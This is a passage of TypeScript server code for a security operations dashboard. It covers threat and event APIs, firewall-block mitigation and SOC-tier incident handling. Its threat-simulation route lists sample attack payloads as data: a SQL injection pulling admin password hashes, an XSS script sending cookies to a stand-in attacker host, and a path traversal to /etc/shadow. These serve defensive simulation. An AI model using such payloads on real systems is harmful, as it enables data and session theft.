      SUM(CASE WHEN LOWER(severity) = 'low' THEN 1 ELSE 0 END) as low,
      SUM(CASE WHEN status NOT IN ('RESOLVED', 'MITIGATED', 'FALSE_POSITIVE') THEN 1 ELSE 0 END) as unresolved
    FROM threats
    WHERE organization_id = ?
  `).get(orgId) as any;

  const metrics = {
    total: Number(metricsRow?.total) || 0,
    critical: Number(metricsRow?.critical) || 0,
    high: Number(metricsRow?.high) || 0,
    medium: Number(metricsRow?.medium) || 0,
    low: Number(metricsRow?.low) || 0,
    unresolved: Number(metricsRow?.unresolved) || 0
  };

  query += ' ORDER BY timestamp DESC';
  const pageNum = Math.max(1, Number(page) || 1);
  const limitNum = Math.min(100, Math.max(1, Number(limit) || 50));
  const offset = (pageNum - 1) * limitNum;
  query += ` LIMIT ${limitNum} OFFSET ${offset}`;

  const rawThreats = db.prepare(query).all(...params) as any[];

  const threats = rawThreats.map(t => {
    let related: string[] = [];
    try {
      related = JSON.parse(t.related_events || '[]');
    } catch {
      related = [];
    }
    const mitre = getMitreAttackMapping(t.attack_type);
    return {
      id: t.id,
      timestamp: t.timestamp,
      sourceIp: t.source_ip,
      target: t.target,
      attackType: t.attack_type,
      category: t.attack_type,
      severity: t.severity,
      confidence: t.confidence || 90,
      action: t.action || 'DETECT',
      status: t.status || 'ACTIVE',
      summary: t.summary,
      detectionReason: t.detection_reason,
      detectionSource: t.action === 'BLOCK' ? 'WAF' : 'Endpoint',
      affectedApplication: t.affected_application,
      destination: t.destination,
      relatedEvents: related,
      recommendedAction: t.recommended_action,
      mitre
    };
  });

  res.json({
    threats,
    total: metrics.total,
    page: pageNum,
    limit: limitNum,
    metrics
  });
});

apiRouter.get('/threats/:id', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const t = db.prepare('SELECT * FROM threats WHERE id = ? AND organization_id = ?').get(req.params.id, orgId) as any;
  if (!t) return res.status(404).json({ error: 'Threat record not found' });

  let related: string[] = [];
  try {
    related = JSON.parse(t.related_events || '[]');
  } catch {
    related = [];
  }

  // Fetch actual related events from database based on source IP or related_events IDs
  const relatedEventsDb = db.prepare(`
    SELECT * FROM security_events 
    WHERE organization_id = ? AND (source_ip = ? OR id IN (${related.map(() => '?').join(',') || "''"}))
    ORDER BY timestamp DESC LIMIT 25
  `).all(orgId, t.source_ip, ...related) as any[];

  const mappedRelated = relatedEventsDb.map(r => ({
    id: r.id,
    timestamp: r.timestamp,
    source: r.source,
    sourceIp: r.source_ip,
    destination: r.destination_ip,
    application: r.application,
    threat: r.threat_name,
    severity: r.severity,
    action: r.action,
    uri: r.uri,
    method: r.method,
    statusCode: r.status_code
  }));

  const mitre = getMitreAttackMapping(t.attack_type);

  res.json({
    id: t.id,
    timestamp: t.timestamp,
    sourceIp: t.source_ip,
    target: t.target,
    attackType: t.attack_type,
    category: t.attack_type,
    severity: t.severity,
    confidence: t.confidence || 90,
    action: t.action,
    status: t.status,
    summary: t.summary,
    detectionReason: t.detection_reason,
    detectionSource: 'Threat Correlation Engine',
    affectedApplication: t.affected_application,
    destination: t.destination,
    relatedEvents: related,
    relatedEventsDetails: mappedRelated,
    recommendedAction: t.recommended_action,
    mitre,
    timeline: [
      { timestamp: t.timestamp, event: `Initial detection of ${t.attack_type} from ${t.source_ip}` },
      { timestamp: t.updated_at || t.timestamp, event: `Status updated to ${t.status}` }
    ]
  });
});

// Update threat status (supports PATCH and POST)
const handleThreatStatusUpdate = (req: AuthenticatedRequest, res: Response) => {
  const orgId = req.organizationId || '';
  const threatId = req.params.id || req.body.threatId;
  const { status } = req.body;

  if (!threatId) return res.status(400).json({ error: 'Threat ID is required' });
  const allowedStatuses = ['NEW', 'ACTIVE', 'INVESTIGATING', 'CONTAINED', 'RESOLVED', 'MITIGATED', 'FALSE_POSITIVE'];
  const upperStatus = String(status || '').toUpperCase();
  if (!allowedStatuses.includes(upperStatus)) {
    return res.status(400).json({ error: `Invalid status. Allowed: ${allowedStatuses.join(', ')}` });
  }

  const existing = db.prepare('SELECT * FROM threats WHERE id = ? AND organization_id = ?').get(threatId, orgId) as any;
  if (!existing) return res.status(404).json({ error: 'Threat record not found' });

  db.prepare(`
    UPDATE threats
    SET status = ?, updated_at = datetime('now')
    WHERE id = ? AND organization_id = ?
  `).run(upperStatus, threatId, orgId);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: `Update Threat Status (${upperStatus})`,
    resource: `Threat ${threatId} [${existing.source_ip}]`,
    resourceId: threatId,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  const updatedThreat = { ...existing, status: upperStatus, updated_at: new Date().toISOString() };
  SecurityEventBus.publish('threat.updated', updatedThreat, orgId);

  res.json({ success: true, threat: updatedThreat });
};

apiRouter.patch('/threats/:id/status', handleThreatStatusUpdate);
apiRouter.post('/threats/:id/status', handleThreatStatusUpdate);

apiRouter.post('/threats/mitigate', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const { threatId, action } = req.body;

  const t = db.prepare('SELECT * FROM threats WHERE id = ? AND organization_id = ?').get(threatId, orgId) as any;
  if (!t) return res.status(404).json({ error: 'Threat not found' });

  const newStatus = action === 'BLOCK' ? 'BLOCKED' : 'MITIGATED';
  db.prepare("UPDATE threats SET status = ?, updated_at = datetime('now') WHERE id = ?").run(newStatus, threatId);

  // If BLOCK requested, insert a real emergency firewall rule blocking this source_ip and queue deployment to all agents
  if (action === 'BLOCK' && t.source_ip) {
    const fwId = `FW-EMERGENCY-${Date.now()}`;
    db.prepare(`
      INSERT INTO firewall_rules (id, organization_id, priority, source, destination, port, protocol, action, enabled, description, created_by)
      VALUES (?, ?, 1, ?, '0.0.0.0/0', 'ANY', 'ALL', 'DENY', 1, ?, ?)
    `).run(
      fwId,
      orgId,
      t.source_ip,
      `Quarantined origin IP for threat ${threatId} (${t.attack_type})`,
      req.user?.email || 'SecOps Analyst'
    );

    SecurityEventBus.publish('rule.updated', { ruleType: 'Firewall', ruleId: fwId, action: 'created', source: t.source_ip }, orgId);
    FirewallDeploymentService.publish(orgId, `Emergency block on threat ${threatId} (${t.source_ip})`);
  }

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: `Mitigate Threat (${action})`,
    resource: `Threat ${threatId} [${t.source_ip}]`,
    resourceId: threatId,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('threat.updated', { threatId, status: newStatus }, orgId);

  res.json({ success: true, threatId, status: newStatus });
});

apiRouter.post('/threats/simulate', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const { attackType } = req.body;

  const catalog = [
    {
      type: 'sqli',
      ipPrefix: '198.51.100.',
      host: 'api.mandiri.oat-sec.net',
      method: 'GET',
      uri: '/v2/transfers?account_id=1029+UNION+SELECT+1,username,password_hash+FROM+admin_users--',
      rule_id: 'OWASP-CRS-942100',
      rule_name: 'SQL Injection in Query Param [account_id]',
      category: 'SQL Injection',
      severity: 'Critical' as const,
      action: 'BLOCK' as const,
      status_code: 403,
      user_agent: 'sqlmap/1.7.9#stable',
      payload_snippet: 'UNION SELECT 1,username,password_hash FROM admin_users--'
    },
    {
      type: 'xss',
      ipPrefix: '203.0.113.',
      host: 'portal.oat-sec.net',
      method: 'POST',
      uri: '/api/v1/user/profile',
      rule_id: 'OWASP-CRS-941100',
      rule_name: 'Cross-Site Scripting (XSS) Tag Injection in bio field',
      category: 'XSS Filter',
      severity: 'High' as const,
      action: 'BLOCK' as const,
      status_code: 403,
      user_agent: 'Mozilla/5.0 (X11; Linux x86_64)',
      payload_snippet: '<script>document.location="http://evil-attacker.io/steal?c="+document.cookie</script>'
    },
    {
      type: 'ssh_brute',
      ipPrefix: '185.220.101.',
      destIp: '10.240.10.14',
      destPort: 22,
      protocol: 'TCP',
      action: 'DENY' as const,
      reason: 'Automated SSH Dictionary Brute Force Detected (hydra/9.5)',
      severity: 'High' as const
    },
    {
      type: 'traversal',
      ipPrefix: '45.33.32.',
      host: 'gateway.oat-sec.net',
      method: 'GET',
      uri: '/static/../../../../etc/shadow',
      rule_id: 'OWASP-CRS-930100',
      rule_name: 'Path Traversal / Local File Inclusion (LFI)',
      category: 'Path Traversal',
      severity: 'High' as const,
      action: 'BLOCK' as const,
      status_code: 403,
      user_agent: 'curl/8.4.0',
      payload_snippet: '../../../../etc/shadow'
    },
    {
      type: 'ddos',
      ipPrefix: '194.26.29.',
      host: 'auth.oat-sec.net',
      method: 'POST',
      uri: '/oauth/token',
      rule_id: 'WAF-RATE-LIMIT-01',
      rule_name: 'Layer 7 HTTP Flood Rate Exceeded (>250 req/sec)',
      category: 'Rate Limiting',
      severity: 'High' as const,
      action: 'RATE_LIMIT' as const,
      status_code: 429,
      user_agent: 'python-requests/2.31.0',
      payload_snippet: 'Burst frequency exceeded cluster limit'
    },
    {
      type: 'bola',
      ipPrefix: '91.240.118.',
      host: 'api.oat-sec.net',
      method: 'GET',
      uri: '/api/v2/tenants/00000000-0000-0000-0000-000000000001/vault/keys',
      rule_id: 'API-SEC-01',
      rule_name: 'Broken Object Level Authorization (BOLA/IDOR)',
      category: 'API Abuse',
      severity: 'Critical' as const,
      action: 'BLOCK' as const,
      status_code: 403,
      user_agent: 'PostmanRuntime/7.36.0',
      payload_snippet: 'Unauthorized tenant vault access attempt'
    }
  ];

  let selected = catalog.find(c => c.type === attackType);
  if (!selected) {
    selected = catalog[Math.floor(Math.random() * catalog.length)];
  }

  // Generate a distinct random IP for each simulation
  const randomLastOctet = Math.floor(Math.random() * 240) + 10;
  const sourceIp = `${selected.ipPrefix}${randomLastOctet}`;

  let eventPayload: any;
  if (selected.type === 'ssh_brute') {
    eventPayload = parseFirewallEvent({
      source_ip: sourceIp,
      destination_ip: (selected as any).destIp || '10.240.10.14',
      source_port: 40000 + Math.floor(Math.random() * 20000),
      destination_port: 22,
      protocol: 'TCP',
      interface: 'eth0',
      direction: 'inbound',
      action: 'DENY',
      reason: (selected as any).reason
    }, orgId);
  } else {
    eventPayload = parseWafEvent({
      source_ip: sourceIp,
      destination_ip: '172.67.182.90',
      host: (selected as any).host,
      method: (selected as any).method,
      uri: (selected as any).uri,
      rule_id: (selected as any).rule_id,
      rule_name: (selected as any).rule_name,
      category: (selected as any).category,
      severity: (selected as any).severity,
      action: (selected as any).action,
      status_code: (selected as any).status_code,
      user_agent: (selected as any).user_agent,
      payload_snippet: (selected as any).payload_snippet
    }, orgId);
  }

  eventPayload.metadata = {
    ...(eventPayload.metadata || {}),
    is_live_simulated: true,
    simulated_at: new Date().toISOString()
  };

  processSecurityEvent(eventPayload);

  res.status(201).json({
    success: true,
    message: `Live threat simulated: ${selected.category || selected.type}`,
    event: eventPayload
  });
});

// ----------------------------------------------------------------------
// 8. Security Events (Unified Stream & Filterable Repository)
// ----------------------------------------------------------------------
const handleGetSecurityEvents = (req: AuthenticatedRequest, res: Response) => {
  const orgId = req.organizationId || '';
  const { category, source, severity, action, status, search, application, eventType, event_type, startDate, endDate, page = 1, limit = 50 } = req.query;

  let query = 'SELECT * FROM security_events WHERE organization_id = ?';
  const params: any[] = [orgId];

  const sourceFilter = source || category;
  if (sourceFilter && sourceFilter !== 'ALL') {
    query += ' AND (LOWER(source) = ? OR LOWER(threat_name) LIKE ?)';
    params.push(String(sourceFilter).toLowerCase(), `%${String(sourceFilter).toLowerCase()}%`);
  }
  const typeFilter = eventType || event_type;
  if (typeFilter && typeFilter !== 'ALL') {
    query += ' AND LOWER(event_type) = ?';
    params.push(String(typeFilter).toLowerCase());
  }
  if (severity && severity !== 'ALL') {
    query += ' AND LOWER(severity) = ?';
    params.push(String(severity).toLowerCase());
  }
  if (action && action !== 'ALL') {
    const actionUpper = String(action).toUpperCase();
    // Filter pills use plain-language groups; raw database values stay supported for exact queries.
    const actionGroups: Record<string, string[]> = {
      BLOCKED: ['BLOCK', 'BLOCKED', 'DENY', 'DROP'],
      ALLOWED: ['ALLOW', 'ALLOWED', 'PASS'],
      CHALLENGED: ['CHALLENGE', 'CHALLENGED', 'RATE_LIMIT'],
      LOGGED: ['LOG', 'LOGGED']
    };
    const group = actionGroups[actionUpper];
    if (group) {
      query += ` AND UPPER(action) IN (${group.map(() => '?').join(', ')})`;
      params.push(...group);
    } else {
      query += ' AND LOWER(action) = ?';
      params.push(String(action).toLowerCase());
    }
  }
  if (application && application !== 'ALL') {
    query += ' AND LOWER(application) LIKE ?';
    params.push(`%${String(application).toLowerCase()}%`);
  }
  if (status && status !== 'ALL') {
    if (status === 'Mitigated') {
      query += " AND action IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP')";
    } else if (status === 'Detected') {
      query += " AND action NOT IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP')";
    }
  }
  if (startDate) {
    query += ' AND timestamp >= ?';
    params.push(String(startDate));
  }
  if (endDate) {
    query += ' AND timestamp <= ?';
    params.push(String(endDate));
  }
  if (search) {
    query += ' AND (LOWER(source_ip) LIKE ? OR LOWER(destination_ip) LIKE ? OR LOWER(threat_name) LIKE ? OR LOWER(application) LIKE ? OR LOWER(uri) LIKE ?)';
    const term = `%${String(search).toLowerCase()}%`;
    params.push(term, term, term, term, term);
  }

  // Count of rows matching the active filters — drives pagination for filtered lists.
  const filteredTotalRow = db.prepare(`SELECT COUNT(*) as total FROM (${query}) AS filtered_events`).get(...params) as any;
  const filteredTotal = Number(filteredTotalRow?.total) || 0;

  // Direct database metric calculations
  const metricsRow = db.prepare(`
    SELECT 
      COUNT(*) as total,
      SUM(CASE WHEN LOWER(severity) = 'critical' THEN 1 ELSE 0 END) as critical,
      SUM(CASE WHEN LOWER(severity) = 'high' THEN 1 ELSE 0 END) as high,
      SUM(CASE WHEN LOWER(severity) = 'medium' THEN 1 ELSE 0 END) as medium,
      SUM(CASE WHEN LOWER(severity) = 'low' THEN 1 ELSE 0 END) as low,
      SUM(CASE WHEN action IN ('ALLOW', 'ALLOWED') THEN 1 ELSE 0 END) as allowed,
      SUM(CASE WHEN action IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP') THEN 1 ELSE 0 END) as blocked,
      SUM(CASE WHEN action IN ('CHALLENGE', 'RATE_LIMIT') THEN 1 ELSE 0 END) as rateLimited
    FROM security_events
    WHERE organization_id = ?
  `).get(orgId) as any;

  const metrics = {
    total: Number(metricsRow?.total) || 0,
    critical: Number(metricsRow?.critical) || 0,
    high: Number(metricsRow?.high) || 0,
    medium: Number(metricsRow?.medium) || 0,
    low: Number(metricsRow?.low) || 0,
    allowed: Number(metricsRow?.allowed) || 0,
    blocked: Number(metricsRow?.blocked) || 0,
    rateLimited: Number(metricsRow?.rateLimited) || 0
  };

  query += ' ORDER BY timestamp DESC';
  const pageNum = Math.max(1, Number(page) || 1);
  const limitNum = Math.min(1000, Math.max(1, Number(limit) || 50));
  const offset = (pageNum - 1) * limitNum;
  query += ` LIMIT ${limitNum} OFFSET ${offset}`;

  const rows = db.prepare(query).all(...params) as any[];

  const events = rows.map(r => {
    const cleanIp = cleanIpOnly(r.source_ip);
    const geo = lookupIpLocation(cleanIp);
    const meta = r.metadata ? JSON.parse(r.metadata) : undefined;
    const fullLogMessage = meta?.rawLog || meta?.logMessage || r.payload_snippet || r.threat_name;
    return {
      id: r.id,
      timestamp: r.timestamp,
      source: r.source,
      sourceIp: cleanIp,
      sourceCountry: geo.country,
      sourceCountryCode: geo.code,
      destination: r.destination_ip || '10.240.10.1',
      destinationIp: r.destination_ip || '10.240.10.1',
      application: r.application || 'Edge Gateway',
      threat: r.threat_name || `${(r.source || 'SEC').toUpperCase()} Event`,
      threatName: r.threat_name || `${(r.source || 'SEC').toUpperCase()} Event`,
      category: eventCategory(r.source),
      eventType: r.event_type || 'network_traffic',
      severity: r.severity || null,
      action: r.action || 'LOG',
      status: (r.action === 'BLOCK' || r.action === 'BLOCKED' || r.action === 'DENY' || r.action === 'DROP') ? 'Mitigated' : 'Detected',
      uri: r.uri,
      method: r.method,
      protocol: r.protocol || 'TCP',
      port: r.port || 443,
      statusCode: r.status_code,
      payloadSnippet: r.payload_snippet || fullLogMessage,
      metadata: meta,
      rawLog: fullLogMessage
    };
  });

  res.json({
    events,
    total: filteredTotal,
    page: pageNum,
    limit: limitNum,
    metrics
  });
};

// Aliases for both /events and /security-events
apiRouter.get('/events', handleGetSecurityEvents);
apiRouter.get('/security-events', handleGetSecurityEvents);

// Event summary metrics endpoint
const handleGetEventsSummary = (req: AuthenticatedRequest, res: Response) => {
  const orgId = req.organizationId || '';
  const metricsRow = db.prepare(`
    SELECT 
      COUNT(*) as total,
      SUM(CASE WHEN LOWER(severity) = 'critical' THEN 1 ELSE 0 END) as critical,
      SUM(CASE WHEN LOWER(severity) = 'high' THEN 1 ELSE 0 END) as high,
      SUM(CASE WHEN LOWER(severity) = 'medium' THEN 1 ELSE 0 END) as medium,
      SUM(CASE WHEN LOWER(severity) = 'low' THEN 1 ELSE 0 END) as low,
      SUM(CASE WHEN action IN ('ALLOW', 'ALLOWED') THEN 1 ELSE 0 END) as allowed,
      SUM(CASE WHEN action IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP') THEN 1 ELSE 0 END) as blocked,
      SUM(CASE WHEN action IN ('CHALLENGE', 'RATE_LIMIT') THEN 1 ELSE 0 END) as rateLimited
    FROM security_events
    WHERE organization_id = ?
  `).get(orgId) as any;

  res.json({
    total: Number(metricsRow?.total) || 0,
    critical: Number(metricsRow?.critical) || 0,
    high: Number(metricsRow?.high) || 0,
    medium: Number(metricsRow?.medium) || 0,
    low: Number(metricsRow?.low) || 0,
    allowed: Number(metricsRow?.allowed) || 0,
    blocked: Number(metricsRow?.blocked) || 0,
    rateLimited: Number(metricsRow?.rateLimited) || 0
  });
};

apiRouter.get('/events/summary', handleGetEventsSummary);
apiRouter.get('/security-events/summary', handleGetEventsSummary);

// Aggregated telemetry for Live Traffic side rail and filter pills — computed from ALL events in DB
const handleGetEventsAggregates = (req: AuthenticatedRequest, res: Response) => {
  const orgId = req.organizationId || '';
  const limit = Math.min(50, Math.max(1, Number(req.query.limit) || 10));

  const totalRow = db.prepare(`
    SELECT COUNT(*) as total
    FROM security_events
    WHERE organization_id = ?
  `).get(orgId) as any;

  const actionRows = db.prepare(`
    SELECT UPPER(action) as action, COUNT(*) as count
    FROM security_events
    WHERE organization_id = ?
    GROUP BY UPPER(action)
  `).all(orgId) as Array<{ action: string | null; count: number }>;

  const actions = { blocked: 0, allowed: 0, challenged: 0, logged: 0, other: 0 };
  for (const row of actionRows) {
    const action = String(row.action || '').toUpperCase();
    const count = Number(row.count) || 0;
    if (['BLOCK', 'BLOCKED', 'DENY', 'DROP'].includes(action)) actions.blocked += count;
    else if (['ALLOW', 'ALLOWED', 'PASS'].includes(action)) actions.allowed += count;
    else if (['CHALLENGE', 'CHALLENGED', 'RATE_LIMIT'].includes(action)) actions.challenged += count;
    else if (['LOG', 'LOGGED'].includes(action)) actions.logged += count;
    else actions.other += count;
  }

  const severityRows = db.prepare(`
    SELECT LOWER(severity) as severity, COUNT(*) as count
    FROM security_events
    WHERE organization_id = ?
    GROUP BY LOWER(severity)
  `).all(orgId) as Array<{ severity: string | null; count: number }>;

  const severities = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const row of severityRows) {
    const severity = String(row.severity || '').toLowerCase();
    const count = Number(row.count) || 0;
    if (severity === 'critical') severities.critical += count;
    else if (severity === 'high') severities.high += count;
    else if (severity === 'medium') severities.medium += count;
    else if (severity === 'low') severities.low += count;
  }

  const topSourceIps = (db.prepare(`
    SELECT source_ip as ip, COUNT(*) as count
    FROM security_events
    WHERE organization_id = ? AND source_ip IS NOT NULL AND source_ip != ''
    GROUP BY source_ip
    ORDER BY count DESC
    LIMIT ?
  `).all(orgId, limit) as Array<{ ip: string; count: number }>).map(row => {
    const geo = lookupIpLocation(row.ip);
    return { ...row, sourceCountry: geo.country, sourceCountryCode: geo.code, sourceCountryFlag: geo.flag };
  });

  const topApplications = db.prepare(`
    SELECT application, COUNT(*) as count
    FROM security_events
    WHERE organization_id = ? AND application IS NOT NULL AND application != ''
    GROUP BY application
    ORDER BY count DESC
    LIMIT ?
  `).all(orgId, limit) as Array<{ application: string; count: number }>;

  // Country aggregates for Cloudflare-style Geo Map: Ambil seluruh sebaran negara dari database
  const countryMap = new Map<string, { country: string; code: string; count: number; lastAttackIp?: string; lastAttackType?: string; lastAttackTime?: number }>();
  const allIpRows = db.prepare(`
    SELECT source_ip, threat_name, event_type, MAX(timestamp) as last_seen, COUNT(*) as count
    FROM security_events
    WHERE organization_id = ? AND source_ip IS NOT NULL AND source_ip != ''
    GROUP BY source_ip, threat_name, event_type
    ORDER BY count DESC
    LIMIT 500
  `).all(orgId) as Array<{ source_ip: string; threat_name?: string; event_type?: string; last_seen?: string; count: number }>;

  for (const r of allIpRows) {
    const geo = lookupIpLocation(r.source_ip);
    const code = (geo.code || 'ID').toUpperCase();
    const country = geo.country || 'Indonesia';
    const existing = countryMap.get(code) || {
      country,
      code,
      count: 0,
      lastAttackIp: r.source_ip,
      lastAttackType: r.threat_name || r.event_type || 'Inbound Scan',
      lastAttackTime: r.last_seen ? new Date(r.last_seen).getTime() : Date.now()
    };
    existing.count += Number(r.count) || 0;
    if (!existing.lastAttackIp && r.source_ip) {
      existing.lastAttackIp = r.source_ip;
      existing.lastAttackType = r.threat_name || r.event_type;
    }
    countryMap.set(code, existing);
  }
  const topCountries = Array.from(countryMap.values()).sort((a, b) => b.count - a.count);

  res.json({
    total: Number(totalRow?.total) || 0,
    actions,
    severities,
    topSourceIps,
    topApplications,
    topCountries
  });
};

apiRouter.get('/events/aggregates', handleGetEventsAggregates);
apiRouter.get('/security-events/aggregates', handleGetEventsAggregates);

// Single event detail with related events lookup
const handleGetSingleEvent = (req: AuthenticatedRequest, res: Response) => {
  const orgId = req.organizationId || '';
  const eventId = req.params.id;

  const event = db.prepare('SELECT * FROM security_events WHERE id = ? AND organization_id = ?').get(eventId, orgId) as any;
  if (!event) return res.status(404).json({ error: 'Security event not found' });

  // Query other events with same source_ip from database
  const relatedEvents = db.prepare(`
    SELECT id, timestamp, source, event_type, severity, action, uri, threat_name
    FROM security_events
    WHERE organization_id = ? AND source_ip = ? AND id != ?
    ORDER BY timestamp DESC LIMIT 10
  `).all(orgId, event.source_ip, eventId) as any[];

  const meta = event.metadata ? JSON.parse(event.metadata) : undefined;
  const fullLog = meta?.rawLog || meta?.logMessage || event.payload_snippet || event.threat_name;

  res.json({
    id: event.id,
    timestamp: event.timestamp,
    source: event.source,
    eventType: event.event_type,
    severity: event.severity,
    sourceIp: event.source_ip,
    destinationIp: event.destination_ip,
    sourcePort: event.port || 443,
    destinationPort: event.port || 443,
    protocol: event.protocol || 'TCP',
    application: event.application,
    action: event.action,
    ruleId: meta ? (meta.rule_id || 'CRS-SIG-01') : 'CRS-SIG-01',
    ruleName: event.threat_name || 'Standard Telemetry Rule',
    description: `Security observation reported by ${event.source} telemetry on ${event.application}.`,
    payloadSnippet: event.payload_snippet || fullLog,
    rawLog: fullLog,
    rawEvent: JSON.stringify(event, null, 2),
    relatedEvents,
    metadata: meta
  });
};

apiRouter.get('/events/:id', handleGetSingleEvent);
apiRouter.get('/security-events/:id', handleGetSingleEvent);

// ----------------------------------------------------------------------
// 9. Incidents Management
// ----------------------------------------------------------------------
type IncidentSocTier = 'L1' | 'L2' | 'L3';

const INCIDENT_TIER_ORDER: Record<IncidentSocTier, number> = { L1: 1, L2: 2, L3: 3 };

function normalizeIncidentTier(value: unknown): IncidentSocTier | null {
  const tier = String(value || '').toUpperCase();
  return tier === 'L1' || tier === 'L2' || tier === 'L3' ? tier : null;
}

/** Resolve the SOC tier of a stored incident, matching the client fallback. */
function incidentTierOf(row: any): IncidentSocTier {
  return normalizeIncidentTier(row?.tier)
    || (row?.severity === 'Critical' ? 'L3' : row?.severity === 'High' ? 'L2' : 'L1');
}

/**
 * SOC tier visibility scope for the signed-in operator.
 * Super Admins are unrestricted. Every other account is scoped only when an
 * explicit SOC tier has been provisioned on the user record.
 */
function incidentScopeForRequest(req: AuthenticatedRequest): IncidentSocTier | null {
  if (!req.user || req.user.role === 'Super Admin') return null;
  if (req.user.socTier) return normalizeIncidentTier(req.user.socTier);
  const role = String(req.user.role || '').toUpperCase();
  if (role.includes('L1')) return 'L1';
  if (role.includes('L2')) return 'L2';
  if (role.includes('L3')) return 'L3';
  return null;
}

function canAccessIncidentTier(req: AuthenticatedRequest, incident: any): boolean {
  const scope = incidentScopeForRequest(req);
  return !scope || incidentTierOf(incident) === scope;
}

function incidentScopeError(req: AuthenticatedRequest): string {
  const scope = incidentScopeForRequest(req);
  return `Incident is outside your assigned SOC ${scope} scope`;
}

apiRouter.get('/incidents', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId || req.user?.organizationId);
  const scope = incidentScopeForRequest(req);
  let query = 'SELECT * FROM incidents WHERE organization_id = ?';
  const params: any[] = [orgId];

  if (scope) {
    // COALESCE keeps legacy rows (tier added later) correctly scoped by severity.
    query += ` AND COALESCE(NULLIF(UPPER(tier), ''), CASE
      WHEN severity = 'Critical' THEN 'L3'
      WHEN severity = 'High' THEN 'L2'
      ELSE 'L1'
    END) = ?`;
    params.push(scope);
  }

  query += ' ORDER BY created_at DESC';
  const rows = db.prepare(query).all(...params) as any[];

  const incidents = rows.map(i => {
    let timeline: any[] = [];
    try {
      timeline = JSON.parse(i.timeline || '[]');
    } catch {
      timeline = [];
    }
    return {
      id: i.id,
      title: i.title,
      severity: i.severity,
      status: i.status,
      tier: i.tier || (i.severity === 'Critical' ? 'L3' : i.severity === 'High' ? 'L2' : 'L1'),
      assignedAnalyst: i.assigned_to,
      affectedAsset: i.affected_asset,
      notes: i.notes,
      timeline,
      created: i.created_at,
      updated: i.updated_at
    };
  });

  res.json({ incidents });
});

apiRouter.post('/incidents/:id/status', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId || req.user?.organizationId);
  const { status, note, analyst, tier } = req.body;

  const incident = db.prepare('SELECT * FROM incidents WHERE id = ? AND organization_id = ?').get(req.params.id, orgId) as any;
  if (!incident) return res.status(404).json({ error: 'Incident not found' });
  if (!canAccessIncidentTier(req, incident)) {
    return res.status(403).json({ error: incidentScopeError(req) });
  }

  let timeline: any[] = [];
  try {
    timeline = JSON.parse(incident.timeline || '[]');
  } catch {
    timeline = [];
  }

  // A scoped operator can never move the case out of their own workspace via a
  // status/note update; only the dedicated escalation endpoint can do that.
  const finalTier = incidentScopeForRequest(req)
    || normalizeIncidentTier(tier)
    || incidentTierOf(incident);

  if (note) {
    timeline.push({
      time: new Date().toISOString(),
      note,
      author: analyst || req.user?.email || 'SOC Analyst',
      tier: finalTier
    });
  }

  db.prepare(`
    UPDATE incidents
    SET status = ?, tier = ?, timeline = ?, updated_at = datetime('now')
    WHERE id = ?
  `).run(status, finalTier, JSON.stringify(timeline), incident.id);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: `Update Incident Status to ${status}`,
    resource: `Incident ${incident.id} (${incident.title})`,
    resourceId: incident.id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('incident.updated', { incidentId: incident.id, status, tier: finalTier }, orgId);

  res.json({ success: true, incident: { ...incident, status, tier: finalTier, timeline } });
});

apiRouter.post('/incidents', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId || req.user?.organizationId);
  const { title, severity, assignedTo, affectedAsset, notes, tier } = req.body;
  if (!title) return res.status(400).json({ error: 'Title is required' });

  const id = `INC-${Date.now()}`;
  // A tier-scoped operator can only declare cases into their own workspace.
  // Cross-tier hand-off happens through the escalation endpoint.
  const incidentTier = incidentScopeForRequest(req)
    || normalizeIncidentTier(tier)
    || (severity === 'Critical' ? 'L3' : severity === 'High' ? 'L2' : 'L1');
  const timeline = [{
    time: new Date().toISOString(),
    note: `Incident declared into SOC [${incidentTier}] pipeline`,
    author: req.user?.email || 'Operator',
    tier: incidentTier
  }];

  db.prepare(`
    INSERT INTO incidents (id, organization_id, title, severity, status, tier, assigned_to, affected_asset, notes, timeline)
    VALUES (?, ?, ?, ?, 'NEW', ?, ?, ?, ?, ?)
  `).run(
    id,
    orgId,
    String(title || 'Security Incident').slice(0, 250),
    severity || 'Medium',
    incidentTier,
    String(assignedTo || 'Unassigned (Triage Queue)').slice(0, 250),
    String(affectedAsset || 'Enterprise Perimeter').slice(0, 250),
    notes || '',
    JSON.stringify(timeline)
  );

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: `Create Incident [${incidentTier}]`,
    resource: `Incident ${id} (${title})`,
    resourceId: id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('incident.created', { id, title, severity, tier: incidentTier, status: 'NEW' }, orgId);

  res.json({ success: true, incident: { id, title, severity, tier: incidentTier, status: 'NEW', assignedAnalyst: assignedTo, affectedAsset, notes, timeline } });
});

apiRouter.post('/incidents/:id/tier', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId || req.user?.organizationId);
  const { tier, note, analyst, assignedTo } = req.body;
  const targetTier = normalizeIncidentTier(tier);
  if (!targetTier) {
    return res.status(400).json({ error: 'Valid SOC tier (L1, L2, L3) is required' });
  }

